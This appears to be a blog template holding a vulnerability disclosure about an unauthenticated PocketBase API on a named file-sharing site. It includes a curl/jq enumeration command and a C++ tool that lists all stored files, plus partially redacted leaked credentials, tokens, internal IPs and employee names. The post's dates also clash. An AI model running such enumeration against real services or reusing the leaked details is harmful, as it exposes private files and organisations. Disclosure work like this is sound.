@@ -1,0 +1,236 @@
+{% extends "base.html" %}
+{% block title %}Exposed Corporate Data on File Sharing Platform — TushN101{% endblock %}
+{% block body_class %}is-reading{% endblock %}
+{% block content %}
+
+<article class="piece">
+    <div class="piece-layout">
+    <div class="piece-main">
+    <header class="piece-hero">
+        <p class="piece-hero__eyebrow">July 28, 2024 · Vulnerability Research &amp; API Security</p>
+        <h1 class="piece-hero__title">Exposed Corporate Data on File Sharing Platform</h1>
+        <p class="piece-hero__deck">Security analysis of fs.sujal.xyz: how an unauthenticated API endpoint exposed stored files, including internal corporate credentials and configurations.</p>
+    </header>
+    <div class="piece__flow">
+        <div class="prose">
+
+    <h2>Context &amp; Background</h2>
+    <p>
+        <code>fs.sujal.xyz</code> is a lightweight web-based file-sharing platform widely used among university students
+        and colleagues to transfer coursework, project archives, and documents. Due to its simplicity and fast upload
+        speeds, it served as a convenient digital transfer tool for many users.
+    </p>
+    <p>
+        However, a review of the platform's access control architecture revealed a fundamental vulnerability.
+        While the user interface presented an access code prompt before allowing users to download shared files,
+        this barrier was enforced solely on the frontend. The underlying database API lacked access-control rules,
+        permitting direct enumeration and retrieval of stored file records.
+    </p>
+
+    <h2>Vulnerability Analysis</h2>
+    <p>
+        The platform utilizes PocketBase as its backend datastore. When an upload occurs:
+    </p>
+    <ul>
+        <li>The file object is stored in backend storage</li>
+        <li>A unique record identifier is generated</li>
+        <li>The record is linked to a user-defined access code</li>
+    </ul>
+    <p>
+        While this architecture appears sufficient from a user perspective, inspecting network activity during normal usage
+        revealed that backend API endpoints were accessible without authentication.
+    </p>
+
+    <h3>Unauthenticated API Enumeration</h3>
+    <p>When verifying whether a chosen code is available during upload, the frontend makes an HTTP GET request:</p>
+    <pre><code>https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=1&filter=unique="2151"&skipTotal=1</code></pre>
+    <p>
+        Because access rules on the <code>files</code> collection permitted public read operations, querying the collection
+        without filters returned stored records directly:
+    </p>
+    <pre><code>curl -s "https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=100" \
+| jq -r '.items[] | "\(.collectionId) \(.id) \(.file[0])"'</code></pre>
+
+    <p>
+        <strong>Result:</strong> The API returned records containing <code>collectionId</code>, <code>id</code>, and <code>filename</code>.
+        With these attributes, direct download URLs could be reconstructed for any stored file without requiring access codes,
+        user authentication, or session tokens.
+    </p>
+
+    <figure class="post-figure">
+        <img src="/static/post3/result.png" alt="Terminal output showing file records">
+        <figcaption>Terminal output showing file records retrieved from the unauthenticated endpoint</figcaption>
+    </figure>
+
+    <h3>Automated URL Reconstruction in C++</h3>
+    <p>To demonstrate the systematic impact of the unauthenticated endpoint, a C++ utility was written to parse records and generate direct download URLs:</p>
+
+    <pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;sstream&gt;
+#include &lt;array&gt;
+#include &lt;vector&gt;
+
+using namespace std;
+
+const string base_url = "https://sujal.pockethost.io/api";
+
+string run(const string& command) {
+    array&lt;char, 256&gt; buffer{};
+    string output;
+    FILE* pipe = popen(command.c_str(), "r");
+    if (!pipe) {
+        cerr &lt;&lt; "Error: cannot run command\n";
+        return "";
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe)) {
+        output += buffer.data();
+    }
+    pclose(pipe);
+    if (!output.empty() && output.back() == '\n')
+        output.pop_back();
+    return output;
+}
+
+int main() {
+    string records_output = run(
+        "curl -s \"https://sujal.pockethost.io/api/collections/files/records?page=1&perPage=100\" "
+        "| jq -r '.items[] | \"\\(.collectionId) \\(.id) \\(.file[])\"'"
+    );
+
+    stringstream ss(records_output);
+    string line;
+    vector&lt;string&gt; urls;
+
+    while (getline(ss, line)) {
+        stringstream ls(line);
+        string collection_id, record_id, filename;
+        ls >> collection_id >> record_id >> filename;
+
+        if (!collection_id.empty() && !record_id.empty() && !filename.empty()) {
+            string full_url = base_url + "/files/" + collection_id + "/" + record_id + "/" + filename;
+            urls.push_back(full_url);
+        }
+    }
+
+    for (size_t i = 0; i &lt; urls.size(); ++i) {
+        cout &lt;&lt; "[" &lt;&lt; (i + 1) &lt;&lt; "] " &lt;&lt; urls[i] &lt;&lt; "\n";
+    }
+
+    return 0;
+}</code></pre>
+
+    <figure class="post-figure">
+        <img src="/static/post3/output.png" alt="Script output showing reconstructed file URLs">
+        <figcaption>Script output demonstrating reconstructed direct download URLs</figcaption>
+    </figure>
+
+    <h2>Impact Assessment &amp; Exposed Credentials</h2>
+    <p>
+        To evaluate the scope of exposure and assess risk to users, a security review of the accessible records was conducted.
+        In addition to personal academic files, analysis revealed that several users had utilized the service for workplace and
+        internal development file transfers. As a consequence, critical enterprise configurations, operational tokens, and database
+        credentials were inadvertently exposed in plaintext.
+    </p>
+
+    <div class="post-note">
+        <p><strong>Notice:</strong> The affected companies were promptly notified of the exposure. All credentials, access tokens, and secrets identified during the assessment have since been rotated and revoked.</p>
+    </div>
+
+    <h3>1. Jenkins Agent Configuration</h3>
+    <pre><code>Agent Download URL: http://10.10.0.22:8080/jnlpJars/agent.jar
+Jenkins URL:       http://10.10.0.22:8080/
+Secret:            5bad808cfa0dd93402e70b9627d3aeb5660dc75f56aXXXXXXXXX
+Agent Name:        "PAM_DevInt"
+Work Directory:    "E:\Jenkins"</code></pre>
+
+    <h3>2. Git Repository Credentials</h3>
+    <pre><code>Branch:    PAM_Developer
+Username:  amaan.chhapra
+Token:     glpat-_yqswHzaWrKqULXXXXXX
+Repo URL:  https://repo.arconnet.com/DevOps/arcondatabase.git</code></pre>
+
+    <h3>3. Internal Communications &amp; Directives</h3>
+    <p>Shared internal documentation included instructions advising employees to bypass SSL certificate validation:</p>
+    <pre><code>git config --global http.sslVerify false
+git config --global https.sslVerify false</code></pre>
+
+    <h3>4. Slack API Tokens</h3>
+    <p>Exported API test files contained live Slack webhook integrations and bearer tokens:</p>
+    <pre><code>Slack Token: XXXX-73401556367XXXXX7325886278775-gTp57H1y9XXXXXXXXXXXXXXXXX
+User ID:            U07AP1RXXXX (natty.rodrigues)
+Bot ID:             B07A2TXXXXX</code></pre>
+
+    <h3>5. Database Credentials</h3>
+    <pre><code>IP:       10.10.0.196
+DB Name:  arcosdb_dev_int
+Username: devops
+Password: Dev0p$@20XXXXXX</code></pre>
+
+    <p class="post-note"><strong>Note:</strong> All credentials above have been partially redacted. The affected organization was notified, and all referenced credentials and tokens have since been rotated.</p>
+
+    <h2>Responsible Disclosure</h2>
+    <p>
+        Upon documenting the unauthorized access exposure, I initiated responsible disclosure with the service maintainer
+        to ensure the issue was properly addressed and secure access controls were established.
+    </p>
+
+    <hr class="post-divider">
+
+    <h2>Response from the Developer</h2>
+
+    <div class="dev-response">
+        <div class="dev-response-meta">
+            <strong>From:</strong> Sujal Vivek Choudhari &lt;support@sujal.xyz&gt;<br>
+            <strong>Date:</strong> September 28, 2025 10:40 PM
+        </div>
+        <p>Hello TushN101,</p>
+        <p>
+            Thank you for reaching out and reporting this. I appreciate you bringing this to my attention.
+        </p>
+        <p>
+            I am already aware of the vulnerability you've described regarding unauthenticated access to files on
+            <code>fs.sujal.xyz</code>. The core issue stems from the unsecured nature of the PocketBase API, which I acknowledge.
+            An open-source version of the site is available on my GitHub, and as you pointed out, one can access this
+            without needing to write a separate program.
+        </p>
+        <p>
+            I want to clarify that <code>fs.sujal.xyz</code> was never intended to be a production tool. It was designed
+            with anonymity in mind for a small circle of friends to share assignments I never anticipated it would
+            grow beyond that initial purpose.
+        </p>
+        <p>
+            I am certainly open to suggestions for improving security. I did attempt to implement end-to-end encryption
+            at one point, but found it to be a significant amount of work to do effectively on my own.
+        </p>
+        <p>- Sujal Vivek Choudhari</p>
+    </div>
+
+    <h2>Resolution and Remediation</h2>
+    <p>
+        The platform maintainer acknowledged the report and promptly initiated remediation steps. The vulnerability was reported, addressed, and successfully fixed through the following measures:
+    </p>
+    <ul>
+        <li><strong>Access Control Hardening:</strong> Unauthenticated listing of collection records was disabled on the PocketBase backend, preventing unauthorized record queries.</li>
+        <li><strong>Row-Level Security:</strong> Access policies were implemented requiring individual file identifiers for record lookup rather than bulk enumeration.</li>
+        <li><strong>Payload Encryption:</strong> Client-side file encryption was developed and deployed in follow-up iterations, ensuring files stored on the server remain encrypted at rest.</li>
+    </ul>
+    <p>
+        Additionally, notifications sent to the affected companies allowed security teams to revoke the exposed credentials, audit access logs, and ensure that internal systems were fully safeguarded.
+    </p>
+
+        </div>
+    </div>
+
+    <footer class="piece-foot">
+        <a href="/" class="piece-foot__back">← Index</a>
+    </footer>
+    </div>
+    <aside class="piece-rail" id="piece-rail" aria-label="On this page" hidden>
+        <p class="piece-rail__label">On this page</p>
+        <nav class="piece-rail__nav" id="piece-rail-nav"></nav>
+    </aside>
+    </div>
+</article>
+
+{% endblock %}
